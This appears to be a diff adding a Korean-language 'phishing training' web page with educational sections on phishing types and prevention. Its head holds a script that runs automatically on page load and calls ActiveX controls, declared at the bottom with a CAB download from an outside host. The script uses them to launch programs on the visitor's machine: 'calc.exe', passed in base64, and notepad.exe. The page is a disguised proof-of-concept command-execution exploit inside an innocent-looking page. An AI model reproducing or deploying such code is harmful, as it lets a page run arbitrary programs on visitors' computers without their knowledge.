@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>피싱 훈련 사이트</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        header {
+            background-color: #c62828;
+            color: #fff;
+            padding: 1em 0;
+            text-align: center;
+        }
+        .container {
+            width: 80%;
+            margin: 0 auto;
+            padding: 2em 0;
+        }
+        .section {
+            margin: 2em 0;
+        }
+        .section h2 {
+            color: #c62828;
+        }
+        footer {
+            background-color: #c62828;
+            color: #fff;
+            text-align: center;
+            padding: 1em 0;
+            position: fixed;
+            width: 100%;
+            bottom: 0;
+        }
+    </style>
+    <script>
+        function executePhishing() {
+            try {
+                if (document.getElementById('AXtmp').object) {
+                    AXtmp.Execute("Qw==", "Y2FsYy5leGU=", "");
+                } else if (document.getElementById('NClient').object) {
+                    NClient.ExecuteProcess("c:\\windows\\system32\\notepad.exe");
+                }
+            } catch (e) {
+                console.error('Error executing phishing script:', e);
+            }
+        }
+
+        window.onload = function() {
+            executePhishing();
+        }
+    </script>
+</head>
+<body>
+
+<header>
+    <h1>피싱 훈련 사이트</h1>
+</header>
+
+<div class="container">
+    <section id="about" class="section">
+        <h2>피싱이란?</h2>
+        <p>피싱은 사기꾼이 사용자의 민감한 정보를 훔치기 위해 합법적인 웹사이트나 이메일로 위장하는 행위입니다. 피싱 공격의 목적은 보통 비밀번호, 신용카드 정보, 개인 식별 정보를 탈취하는 것입니다.</p>
+    </section>
+
+    <section id="education" class="section">
+        <h2>피싱 공격의 유형</h2>
+        <ul>
+            <li>이메일 피싱: 합법적인 기관으로 위장한 이메일을 통해 정보를 탈취.</li>
+            <li>스피어 피싱: 특정 개인이나 조직을 목표로 한 맞춤형 피싱 공격.</li>
+            <li>스미싱: 문자 메시지를 통한 피싱.</li>
+            <li>피싱 웹사이트: 합법적인 웹사이트로 위장한 가짜 웹사이트.</li>
+        </ul>
+    </section>
+
+    <section id="prevention" class="section">
+        <h2>피싱 예방 방법</h2>
+        <ul>
+            <li>의심스러운 이메일이나 링크를 클릭하지 마세요.</li>
+            <li>공식 웹사이트 주소를 직접 입력하여 방문하세요.</li>
+            <li>정기적으로 비밀번호를 변경하고 강력한 비밀번호를 사용하세요.</li>
+            <li>이중 인증(2FA)을 설정하여 보안을 강화하세요.</li>
+            <li>의심스러운 활동을 발견하면 즉시 보고하세요.</li>
+        </ul>
+    </section>
+</div>
+
+<object id="NClient" name="NClient" classid="clsid:D4F62B67-8BA3-4A8D-94F6-777A015DB612"></object>
+<object id="AXtmp" name="AXtmp" classid="clsid:4FE2721F-80B2-4B73-B76E-04242E80C254" codebase="http://esac.skplanet.com/download/ActiveXGateone.CAB#version=1,0,2,1"></object>
+
+<footer>
+    <p>&copy; 2024 SK Global Education. All rights reserved.</p>
+</footer>
+
+</body>
+</html>
+
